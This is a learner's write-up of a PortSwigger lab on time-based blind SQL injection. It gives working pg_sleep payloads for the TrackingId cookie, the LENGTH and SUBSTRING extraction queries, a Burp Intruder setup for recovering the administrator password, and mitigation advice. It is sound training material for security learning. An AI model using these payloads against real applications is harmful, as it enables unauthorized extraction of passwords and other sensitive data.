## Lab 15: Blind SQL Injection with Time Delays and Information Retrieval

### Platform

PortSwigger Web Security Academy

### Difficulty

Practitioner

### Topic

SQL Injection / Blind SQL Injection / Time-Based SQL Injection / Information Retrieval

### Lab Status

Solved

### Objective

The goal of this lab was to exploit a blind SQL injection vulnerability in the `TrackingId` cookie and recover the administrator user's password using conditional time delays.

### Simple Explanation

In this lab, the application did not display SQL query results.

It also did not show useful error messages or respond differently when a condition was true or false.

However, the application executed the SQL query synchronously. This means the application waited for the database query to finish before sending the response.

By injecting a conditional time delay, it was possible to ask the database true or false questions.

If the condition was true, the database delayed the response for 10 seconds.

If the condition was false, the application responded immediately.

This timing difference was used to determine the administrator password one character at a time.

### Vulnerability Description

The application used the value of the `TrackingId` cookie inside a SQL query without secure handling.

Although query results were hidden, the response time could be controlled using injected SQL.

This created a time-based blind SQL injection vulnerability that allowed sensitive information to be inferred from response delays.

### Key Concept

Time-based blind SQL injection uses response time as the feedback mechanism.

Instead of looking for visible output, error messages, or different page content, the attacker observes how long the application takes to respond.

In this lab:

```text
10-second delay = condition is true
Fast response = condition is false
```

This allowed the password to be extracted by testing its length and then testing each character.

### Steps Taken

Opened the lab using Burp Suite's built-in browser.

Visited the front page of the shop.

Intercepted the request containing the `TrackingId` cookie.

Sent the request to Burp Repeater.

Injected a conditional time delay using `pg_sleep(10)`.

Tested a true condition and confirmed that the response was delayed.

Tested a false condition and confirmed that the response returned immediately.

Confirmed that the `administrator` user existed.

Determined the length of the administrator password using `LENGTH(password)`.

Used `SUBSTRING()` to test each character of the password.

Sent the request to Burp Intruder.

Configured Intruder to test lowercase letters and numbers.

Configured the resource pool to use only one concurrent request.

Reviewed the `Response received` time to identify the correct character.

Repeated the attack for each password position.

Recovered the administrator password.

Logged in as the administrator user.

Successfully solved the lab.

### Important Payload Logic

The main idea was to use this structure:

```sql
SELECT CASE WHEN condition THEN pg_sleep(10) ELSE pg_sleep(0) END
```

If the condition was true, the database executed:

```sql
pg_sleep(10)
```

This caused a 10-second delay.

If the condition was false, the database executed:

```sql
pg_sleep(0)
```

This caused no delay.

### Example True Condition

The following payload caused a 10-second delay because `1=1` is true:

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

### Example False Condition

The following payload responded immediately because `1=2` is false:

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

This confirmed the timing logic:

```text
Delayed response = true
Immediate response = false
```

### Confirming the Administrator User

The administrator user was confirmed using:

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

A 10-second delay confirmed that the `administrator` user existed.

### Password Length Testing

The password length was tested using:

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

The number was increased until the application stopped delaying.

The password length was found to be:

```text
20 characters
```

### Character Extraction

Each character was tested using:

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

The position number was changed from `1` to `20`.

The tested character was changed through lowercase letters and numbers.

When the response took around 10 seconds, the tested character was correct.

### Burp Intruder Configuration

Burp Intruder was used to automate character testing.

The payload marker was placed around the tested character:

```sql
SUBSTRING(password,1,1)='§a§'
```

The payload list included:

```text
abcdefghijklmnopqrstuvwxyz0123456789
```

Because timing was important, the Intruder resource pool was configured with:

```text
Maximum concurrent requests = 1
```

This made the timing results more reliable.

### Recovered Password

The administrator password was successfully recovered:

```text
n61v2kl2d564et4s6emh
```

### Result

The administrator password was successfully extracted using time-based blind SQL injection.

The recovered password was used to log in as the administrator user and solve the lab.

### What I Learned

Blind SQL injection can be exploited even when there are no visible results, no useful errors, and no response content differences.

Response time can be used as an indirect signal.

Conditional time delays can turn true or false SQL conditions into observable behavior.

`pg_sleep()` can be used in PostgreSQL to delay query execution.

`LENGTH()` can be used to determine the length of sensitive data.

`SUBSTRING()` can be used to extract data one character at a time.

Burp Intruder can automate repetitive testing.

Timing-based attacks require careful configuration, such as using one concurrent request.

### Security Impact

In a real-world application, this vulnerability could allow attackers to extract sensitive information such as usernames, passwords, API keys, session tokens, or personal data.

Even if the application hides query results and database errors, response timing can still leak confidential information.

### Mitigation

To prevent this vulnerability, developers should:

Use parameterized queries or prepared statements.

Avoid inserting user-controlled input directly into SQL queries.

Validate and sanitize all user-controlled input, including cookies.

Apply least-privilege database permissions.

Set reasonable database query timeout limits.

Monitor unusual delays and repetitive requests.

Use secure logging and alerting for suspicious SQL behavior.

Avoid exposing backend behavior through response timing where possible.

### Tools Used

PortSwigger Web Security Academy

Burp Suite Community Edition

Burp Proxy

Burp Repeater

Burp Intruder

Web Browser

